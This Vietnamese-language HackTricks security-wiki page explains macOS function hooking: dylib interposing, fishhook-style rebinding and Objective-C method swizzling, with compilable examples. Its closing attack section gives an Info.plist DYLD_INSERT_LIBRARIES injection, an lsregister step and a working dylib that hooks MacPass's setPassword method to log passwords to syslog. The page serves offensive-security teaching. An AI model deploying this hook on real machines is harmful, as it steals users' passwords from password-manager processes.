# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Tạo một **dylib** có section **`__interpose` (`__DATA___interpose`)** (hoặc một section có cờ **`S_INTERPOSING`**) chứa các tuple gồm **function pointer** trỏ đến các hàm **gốc** và hàm **thay thế**.

Sau đó, **inject** dylib bằng **`DYLD_INSERT_LIBRARIES`** (việc interposing cần diễn ra trước khi ứng dụng chính được tải). Rõ ràng là [các **hạn chế** áp dụng cho việc sử dụng **`DYLD_INSERT_LIBRARIES`** cũng áp dụng ở đây](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}

```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
    //va_list args;
    //va_start(args, format);
    //int ret = vprintf(format, args);
    //va_end(args);

    int ret = printf("Hello from interpose\n");
    return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```

{{#endtab}}

{{#tab name="hello.c"}}

```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
    printf("Hello World!\n");
    return 0;
}
```

{{#endtab}}

{{#tab name="interpose2.c"}}

```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
    __attribute__((used)) static struct { \
        const void* replacement; \
        const void* replacee; \
    } _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
        (const void*) (unsigned long) &_replacement, \
        (const void*) (unsigned long) &_replacee \
    };

int my_printf(const char *format, ...)
{
    int ret = printf("Hello from interpose\n");
    return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```

{{#endtab}}
{{#endtabs}}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```

> [!WARNING]
> Biến môi trường **`DYLD_PRINT_INTERPOSING`** có thể được dùng để debug interposing và sẽ in ra quy trình interpose.

Cũng lưu ý rằng **interposing diễn ra giữa process và các thư viện đã load**, nó không hoạt động với shared library cache.

### Dynamic Interposing

Giờ đây cũng có thể interpose một function một cách linh động bằng function **`dyld_dynamic_interpose`**. Cách này cho phép interpose một function **theo cách lập trình** trong **runtime**, thay vì chỉ thực hiện việc đó từ **đầu**.

Chỉ cần chỉ định các **tuple** gồm **function cần thay thế và function thay thế**.

```c
struct dyld_interpose_tuple {
    const void* replacement;
    const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
        const struct dyld_interpose_tuple array[], size_t count);
```

### Import Table Rebinding (fishhook-style)

Nếu bạn đã thực thi được code **bên trong process** và muốn hook một **hàm C được import** mà không khởi chạy lại target, một primitive rất phổ biến là **symbol rebinding** (được phổ biến bởi **`fishhook`**).

Thay vì sử dụng section **`__interpose`**, kỹ thuật này duyệt metadata Mach-O (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) và **ghi đè import slot** mà image hiện tại sử dụng. Cách này rất hữu ích để hook các hàm trong một process **đang chạy** hoặc chỉ hook **một image** bằng **`rebind_symbols_image`**.<sup>[[2]](#references)</sup>

> [!TIP]
> Cách này chỉ ảnh hưởng đến những lệnh gọi thực sự đi qua **import pointer**. Nếu hàm mục tiêu được **gọi trực tiếp bên trong cùng image**, thì không có import slot nào để sửa, vì vậy kỹ thuật này sẽ không phát hiện được call site đó.

```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
    fprintf(stderr, "[+] close(%d)\n", fd);
    return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
    struct rebinding rb = {"close", hooked_close, (void *)&real_close};
    rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```

Trên các phiên bản macOS gần đây, nhiều mục tiêu rebinding không còn nằm trong các trang **`__DATA`** có thể ghi. Các rebinder thường cần tạm thời cấp quyền ghi cho **`__DATA_CONST`** trước khi vá pointer. Ngoài ra, trên Apple Silicon / **`arm64e`**, bạn nên dự kiến sẽ gặp các pointer đã xác thực và một lớp gián tiếp bổ sung trong **`__AUTH_CONST.__auth_got`**. Vì vậy, rebinder chỉ quét các section con trỏ symbol lazy/non-lazy kiểu cũ có thể bỏ sót một số call site.<sup>[[3]](#references)</sup>

> [!CAUTION]
> ABI **`arm64e`** sử dụng **Pointer Authentication (PAC)** cho nhiều function pointer. Việc ghi pointer một cách mù quáng, vốn từng hoạt động trên Intel, có thể làm hỏng call site trên Apple Silicon. Khi tự viết rebinder hoặc inline hooker, hãy sẵn sàng dùng các helper trong **`<ptrauth.h>`** như **`ptrauth_sign_unauthenticated`** hoặc **`ptrauth_auth_and_resign`**, đồng thời kiểm thử cụ thể trên các mục tiêu **`arm64e`**.

Để biết thêm chi tiết về **`__AUTH`**, **`__AUTH_CONST`** và **`__auth_got`**, hãy xem [trang này](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

Trong ObjectiveC, một method được gọi như sau: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Cần có **object**, **method** và **params**. Khi một method được gọi, một **msg được gửi** bằng function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object là **`someObject`**, method là **`@selector(method1p1:p2:)`** và các đối số là **value1**, **value2**.

Dựa theo cấu trúc object, có thể truy cập đến **mảng các method**, nơi lưu **tên** và **pointer** đến mã của method.<sup>[[1]](#references)</sup>

> [!CAUTION]
> Lưu ý rằng vì các method và class được truy cập dựa trên tên, thông tin này được lưu trong binary. Do đó, có thể lấy thông tin này bằng `otool -ov </path/bin>` hoặc [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Truy cập các method thô

Có thể truy cập các thông tin của method như tên, số lượng params hoặc địa chỉ, như trong ví dụ sau:

```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
    // Get class of the variable
    NSString* str = @"This is an example";
    Class strClass = [str class];
    NSLog(@"str's Class name: %s", class_getName(strClass));

    // Get parent class of a class
    Class strSuper = class_getSuperclass(strClass);
    NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

    // Get information about a method
    SEL sel = @selector(length);
    NSLog(@"Selector name: %@", NSStringFromSelector(sel));
    Method m = class_getInstanceMethod(strClass,sel);
    NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
    NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

    // Iterate through the class hierarchy
    NSLog(@"Listing methods:");
    Class currentClass = strClass;
    while (currentClass != NULL) {
        unsigned int inheritedMethodCount = 0;
        Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

        NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

        for (unsigned int i = 0; i < inheritedMethodCount; i++) {
            Method method = inheritedMethods[i];
            SEL selector = method_getName(method);
            const char* methodName = sel_getName(selector);
            unsigned long address = (unsigned long)method_getImplementation(m);
            NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
        }

        // Free the memory allocated by class_copyMethodList
        free(inheritedMethods);
        currentClass = class_getSuperclass(currentClass);
    }

    // Other ways to call uppercaseString method
    if([str respondsToSelector:@selector(uppercaseString)]) {
        NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
        NSLog(@"Uppercase string: %@", uppercaseString);
    }

    // Using objc_msgSend directly
    NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
    NSLog(@"Uppercase string: %@", uppercaseString2);

    // Calling the address directly
    IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
    NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
    NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
    NSLog(@"Uppercase string: %@", uppercaseString3);

    return 0;
}
```

### Method Swizzling với method_exchangeImplementations

Hàm **`method_exchangeImplementations`** cho phép **thay đổi** **địa chỉ** của **implementation** của **một hàm thành địa chỉ của hàm kia**.

> [!CAUTION]
> Vì vậy, khi một hàm được gọi, **hàm kia sẽ được thực thi**.

```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
    NSLog(@"Custom implementation of substringFromIndex:");

    // Call the original method
    return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
    // Perform method swizzling
    Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
    Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
    method_exchangeImplementations(originalMethod, swizzledMethod);

    // We changed the address of one method for the other
    // Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
    // And when swizzledSubstringFromIndex is called, substringFromIndex is really called

    // Example usage
    NSString *myString = @"Hello, World!";
    NSString *subString = [myString substringFromIndex:7];
    NSLog(@"Substring: %@", subString);

    return 0;
}
```

> [!WARNING]
> Trong trường hợp này, nếu **mã triển khai của phương thức hợp lệ** **xác minh** **tên** **phương thức**, nó có thể **phát hiện** việc swizzling này và ngăn không cho nó chạy.
>
> Kỹ thuật sau đây không bị hạn chế này.

### Method Swizzling với method_setImplementation

Cách trước đó khá kỳ lạ vì bạn thay đổi implementation của hai method cho nhau. Dùng hàm **`method_setImplementation`**, bạn có thể **thay đổi** **implementation** của một **method thành implementation của method kia**.

Chỉ cần nhớ **lưu địa chỉ implementation của method gốc** nếu bạn định gọi nó từ implementation mới trước khi ghi đè, vì sau đó việc tìm lại địa chỉ đó sẽ phức tạp hơn nhiều.

```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
    NSLog(@"Custom implementation of substringFromIndex:");

    // Call the original implementation using objc_msgSendSuper
    return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // Get the class of the target method
        Class stringClass = [NSString class];

        // Get the swizzled and original methods
        Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

        // Get the function pointer to the swizzled method's implementation
        IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

        // Swap the implementations
        // It return the now overwritten implementation of the original method to store it
        original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

        // Example usage
        NSString *myString = @"Hello, World!";
        NSString *subString = [myString substringFromIndex:7];
        NSLog(@"Substring: %@", subString);

        // Set the original implementation back
        method_setImplementation(originalMethod, original_substringFromIndex);

        return 0;
    }
}
```

## Phương pháp tấn công Hooking

Trang này đã thảo luận các cách khác nhau để hook function. Tuy nhiên, các cách này đều yêu cầu **chạy code bên trong process cần tấn công**.

Cách dễ nhất để làm việc đó là inject [Dyld thông qua environment variables hoặc hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Tuy nhiên, tôi cho rằng việc này cũng có thể được thực hiện thông qua [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Tuy nhiên, cả hai lựa chọn đều **chỉ áp dụng được** cho các binary/process **không được bảo vệ**. Hãy xem từng kỹ thuật để tìm hiểu thêm về các hạn chế.

Tuy nhiên, tấn công function hooking có mục đích rất cụ thể: kẻ tấn công sẽ thực hiện việc này để **đánh cắp thông tin nhạy cảm từ bên trong process** (nếu không thì chỉ cần thực hiện tấn công process injection). Thông tin nhạy cảm này có thể nằm trong các App do người dùng tải xuống, chẳng hạn như MacPass.

Vì vậy, vector tấn công sẽ là tìm một lỗ hổng hoặc gỡ signature của ứng dụng, rồi inject biến môi trường **`DYLD_INSERT_LIBRARIES`** thông qua Info.plist của ứng dụng bằng cách thêm nội dung như sau:

```xml
<key>LSEnvironment</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```

và sau đó **đăng ký lại** ứng dụng:

```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```

Thêm vào library đó hooking code để exfiltrate thông tin: Passwords, messages...

> [!CAUTION]
> Lưu ý rằng trong các phiên bản macOS mới hơn, nếu bạn **strip chữ ký** của application binary và ứng dụng đó đã được thực thi trước đó, macOS sẽ **không thực thi ứng dụng đó nữa**.

#### Ví dụ về library

```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
    // Function that will log the password and call the original setPassword(pass, file_path) method
    NSLog(@"[+] Password is: %@", password);

    // After logging the password call the original method so nothing breaks.
    return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
    // Get the real method address to not lose it
    Class classMPDocument = NSClassFromString(@"MPDocument");
    Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

    // Make the original method setPassword call the fake implementation one
    IMP fake_IMP = (IMP)custom_setPassword;
    real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```

## References

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: Thư viện đơn giản hóa quy trình liên kết lại động các symbol trong tệp nhị phân Mach-O](https://github.com/facebook/fishhook)
- [3] [Xác thực con trỏ — Tài liệu Clang](https://clang.llvm.org/docs/PointerAuthentication.html)
{{#include ../../../banners/hacktricks-training.md}}


